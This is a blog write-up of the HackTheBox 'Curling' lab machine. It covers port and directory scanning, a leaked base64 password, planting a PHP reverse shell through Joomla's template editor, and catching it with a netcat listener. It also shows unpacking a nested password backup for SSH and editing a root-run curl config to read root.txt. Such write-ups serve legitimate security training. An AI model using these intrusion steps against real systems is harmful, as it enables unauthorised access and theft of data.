---
layout: post
title: Hackthebox Curling Writeup
categories: HackTheBox
---

<img src="/public/images/2019-03-30/curling_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Curling" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.150 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-27 22:03 EEST
Nmap scan report for 10.10.10.150
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.150 -x .php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.150/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2018/10/27 22:13:43 Starting gobuster
=====================================================
/index.php (Status: 200)
/images (Status: 301)
/media (Status: 301)
/templates (Status: 301)
/modules (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/configuration.php (Status: 200)
/cli (Status: 301)
/server-status (Status: 403)
=====================================================
2018/10/27 22:43:46 Finished
=====================================================
{% endhighlight %}

### 2. Getting User
We can figure out that Joomla is running on port 80.
![placeholder](https://inar1.githuib.io/public/images/2019-03-30/2019-03-24-15-14-26.png)

There is an interesting line in html source code.
![placeholder](https://inar1.githuib.io/public/images/2019-03-30/2019-03-24-15-20-11.png)

In the "secret.txt", we have base64 encoded message.
{% highlight shell %}
root@kali:~# curl http://10.10.10.150/secret.txt
Q3VybGluZzIwMTgh

root@kali:~# echo -n "Q3VybGluZzIwMTgh" | base64 -d
Curling2018!
{% endhighlight %}

We can use this text for login credential.
{% highlight shell %}
floris:Curling2018!
{% endhighlight %}

Now we have a control of admin console.<br>
Try to upload our shellcode. Go to "Extensions" -> "Templates" -> "Templates".
![placeholder](https://inar1.githuib.io/public/images/2019-03-30/2019-03-24-15-49-36.png)

Then choose "Protostar Details and Files" -> "index.php"
![placeholder](https://inar1.githuib.io/public/images/2019-03-30/2019-03-23-17-37-06.png)

Now we have a console which we can edit the source code of index.php.<br>
Let's add reverse shell code (<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">example</a>) here and access "http://10.10.10.150/index.php". We can achieve a reverse shell.
{% highlight shell %}
# on localhost
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.150] 43324
Linux curling 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 14:32:45 up 3 days,  3:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
{% endhighlight %}

However, we still do not have access permission to user.txt
{% highlight shell %}
$ ls -l /home/floris/
total 12
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
$ whoami
www-data
$ cat /home/floris/user.txt
cat: /home/floris/user.txt: Permission denied
{% endhighlight %}

We can find that there is a text file looks like output of hex editor.
{% highlight shell %}
$ cat /home/floris/password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
{% endhighlight %}

By the header of this file, we can find that this file is bzip2 file.<br>
But before that, let's reset this file to normal binary.
{% highlight shell %}
root@kali:~# xxd -r password_backup > password_backup_bin.txt

root@kali:~# cat password_backup_bin.txt
BZh91AY&SY���H���A��P)ava�:4N���nT#�@%�`
                                         ��z�@�i�4hdi���9�h�Q�dh����4i�5n�׌��Jh�"��n�y.�<~�x�>  �sVT�zH�ߢ�1�V��`F���s
     ۇ7j:X�dR��k�� ���)p�7۫;���9��PC�Y�P	�HB��*	��G� �U@r�rE8P����H

root@kali:~# file password_backup_bin.txt 
password_backup_bin.txt: bzip2 compressed data, block size = 900k
{% endhighlight %}

Then, extract data from the compressed bzip2 file.<br>
We got a gzip compressed file.
{% highlight shell %}
root@kali:~# mv password_backup_bin.txt password_backup_bin.bz2

root@kali:~# bunzip2 password_backup_bin.bz2 

root@kali:~# ls
Desktop    Downloads  password_backup      Pictures  Templates
Documents  Music      password_backup_bin  Public    Videos

root@kali:~# file password_backup_bin 
password_backup_bin: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141
{% endhighlight %}

Extract compressed file again.<br>
We got a new bzip2 file.
{% highlight shell %}
root@kali:~# mv password_backup_bin password_backup_bin.gz

root@kali:~# gunzip password_backup_bin.gz

root@kali:~# ls
Desktop  Documents  Downloads  Music  password_backup  password_backup_bin  Pictures  Public  Templates  Videos

root@kali:~# file password_backup_bin
password_backup_bin: bzip2 compressed data, block size = 900k
{% endhighlight %}

Extract new bzip2 file. We can obtain a tar file.
{% highlight shell %}
root@kali:~# mv password_backup_bin password_backup_bin.bz2

root@kali:~# ls
Desktop  Documents  Downloads  Music  password_backup  password_backup_bin  Pictures  Public  Templates  Videos

root@kali:~# file password_backup_bin
password_backup_bin: POSIX tar archive (GNU)
{% endhighlight %}

Finally extract tar archive we achieved last step. We can get an interesting file "password.txt".
{% highlight shell %}
root@kali:~# mv password_backup_bin password_backup_bin.tar
root@kali:~# tar -xvf password_backup_bin.tar 
password.txt
root@kali:~# cat password.txt 
5d<wdCbdZu)|hChXll
{% endhighlight %}

Now we achieved a following credential.
{% highlight shell %}
floris:5d<wdCbdZu)|hChXll
{% endhighlight %}

We can use this for ssh connection.<br>
user.txt is in the home directory.
{% highlight shell %}
root@kali:~# ssh floris@10.10.10.150

~~~

floris@curling:~$ ls
admin-area  password_backup  user.txt
floris@curling:~$ cat user.txt
65dd1df0713b40d88ead98cf11b8530b
{% endhighlight %}

### 3. Getting Root

Getting root.txt is straitforward.<br>
There is a directory "admin-area" which has some files.
{% highlight shell %}
floris@curling:~/admin-area$ ls -la
total 16
drwxr-x--- 2 root   floris 4096 May 22  2018 .
drwxr-xr-x 6 floris floris 4096 May 22  2018 ..
-rw-rw---- 1 root   floris   25 Mar 24 15:11 input
-rw-rw---- 1 root   floris   92 Mar 24 15:11 report

floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"

floris@curling:~/admin-area$ cat report
WARNING: Failed to daemonise.  This is quite common and not fatal.
Connection refused (111)
{% endhighlight %}

By editing the file "~/admin-area/input", we can achieve the content of root.txt
{% highlight shell %}
floris@curling:~/admin-area$ echo 'url = "file:///root/root.txt"' > input

{% endhighlight %}

Content of root.txt:
{% highlight shell %}
floris@curling:~/admin-area$ cat report 
82c198ab6fc5365fdc6da2ee5c26064a
{% endhighlight %}
